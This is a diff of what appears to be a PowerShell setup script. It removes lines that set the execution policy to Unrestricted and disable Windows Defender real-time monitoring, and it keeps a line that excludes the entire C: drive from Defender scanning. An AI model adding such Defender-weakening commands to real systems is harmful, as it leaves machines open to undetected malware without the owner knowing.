@@ -64,20 +64,7 @@ try {
     Write-Host "WARNING: Failed to start WinHttpAutoProxySvc or BITS: $_" -ForegroundColor Yellow
 }
 
-# 5. Ensure PowerShell Execution Policy is unrestricted
 try {
-    Set-ExecutionPolicy -ExecutionPolicy Unrestricted -Scope Process -Force
-    Write-Host "Set PowerShell Execution Policy to Unrestricted." -ForegroundColor Green
-} catch {
-    Write-Host "WARNING: Failed to modify execution policy: $_" -ForegroundColor Yellow
-}
-
-try {
-    # Disable Windows Defender real-time monitoring
-    Set-MpPreference -DisableRealtimeMonitoring $true -ErrorAction Stop
-    Write-Host "Windows Defender real-time monitoring disabled."
-
-    # Add C:\* as an exclusion path
     Set-MpPreference -ExclusionPath "C:\*" -ErrorAction Stop
     Write-Host "Added 'C:\*' as a Defender exclusion path."
 
